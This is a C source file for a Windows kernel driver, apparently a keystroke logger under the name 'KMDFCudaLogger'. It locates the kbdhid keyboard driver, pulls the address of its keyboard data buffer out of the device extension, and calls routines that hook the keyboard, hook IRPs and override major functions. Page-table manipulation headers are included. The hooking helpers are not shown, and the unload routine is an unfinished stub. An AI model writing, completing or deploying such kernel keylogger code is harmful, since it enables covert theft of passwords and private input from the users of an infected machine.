#include <ntddk.h>
#include <wdf.h>  
#include <Driver.h>   
#include <ControlDevice.h>
#include <PageTableManipulation.h>
#include <KeyboardHooker.h>

PDEVICE_OBJECT usbBaseKeyboardDeviceObject;
DRIVER_INITIALIZE DriverEntry;
PULONG keyboardBuffer = NULL;

_Use_decl_annotations_
NTSTATUS GetKeyboardMemoryBuffer(IN PDRIVER_OBJECT pDriverObject)
{
	//the filter device object   
	NTSTATUS status;
	POBJECT_TYPE driverObjectType;
	PDRIVER_OBJECT kbdHidDriverObject;
	UNICODE_STRING kbdHidDriverName;
	PrepHook(pDriverObject);

	// First, get the kbdhid driver
	RtlInitUnicodeString(&kbdHidDriverName, L"\\Driver\\kbdhid");
	driverObjectType = ObGetObjectType(pDriverObject);
	status = ObReferenceObjectByName(&kbdHidDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, driverObjectType, //(POBJECT_TYPE)IoDriverObjectType,
		KernelMode, NULL, (PVOID*)&kbdHidDriverObject);

	if (NT_SUCCESS(status)) {
		KdPrint(("kbdHidDriverObject is [0x%lx]\n", kbdHidDriverObject));
		usbBaseKeyboardDeviceObject = kbdHidDriverObject->DeviceObject;
		if (usbBaseKeyboardDeviceObject) {
			KdPrint(("usbBaseKeyboardDeviceObject is [0x%lx]\n", usbBaseKeyboardDeviceObject));
			PUSBK_EXT usbBaseDeviceExtension = (PUSBK_EXT)usbBaseKeyboardDeviceObject->DeviceExtension;
			KdPrint(("usbBaseDeviceExtension is [0x%lx]\n", usbBaseDeviceExtension));
			PUSBK_DATA dataPointer = usbBaseDeviceExtension->dataPointer;
			ULONG buffer = dataPointer->buffer;
			PULONG bufferAddress = &dataPointer->buffer;
			KdPrint(("bufferAddress is [0x%lx]\n", bufferAddress));
			keyboardBuffer = bufferAddress;


			KdPrint(("about to try to hook keyboard\n"));
			//pauseForABit(10);
			HookKeyboard(pDriverObject, usbBaseKeyboardDeviceObject); // hk

		}
	}
	return status;
}//end HookKeyboard   

_Use_decl_annotations_
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	NTSTATUS status;
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "KMDFCudaLogger: DriverEntry\n"));

//	KdPrint(("about to try to hook IRPs\n"));
//	pauseForABit(10);
	HookIrps(DriverObject); // hk

	KdPrint(("Getting Keyboar dMemory Buffer\n"));
	status = GetKeyboardMemoryBuffer(DriverObject);

	// Set the DriverUnload procedure   
	KdPrint(("Set DriverUnload function pointer\n"));
	DriverObject->DriverUnload = Unload;

	KdPrint(("Creating Control Device\n"));
	status = CreateControlDevice( DriverObject,  RegistryPath);

//	KdPrint(("about to set major function\n"));
//	pauseForABit(10);
	SetMajorFunction(DriverObject); // hk

	KdPrint(("Exiting Driver Entry\n"));

	return status;
}
 
 
_Use_decl_annotations_
VOID Unload(IN PDRIVER_OBJECT pDriverObject)
{
	KdPrint(("Unload IRQ Level [%u]", KeGetCurrentIrql()));
	
	// TODO: need to implement this
	KdPrint(("Removing Control Device...\n"));
	//RemoveControlDevice(pDriverObject);

	//PKLOG_DEVICE_EXTENSION pKeyboardDeviceExtension = (PKLOG_DEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	//IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
	//DbgPrint("Keyboard hook detached from device...\n");

	//IoDeleteDevice(pDriverObject->DeviceObject);

	return;
}

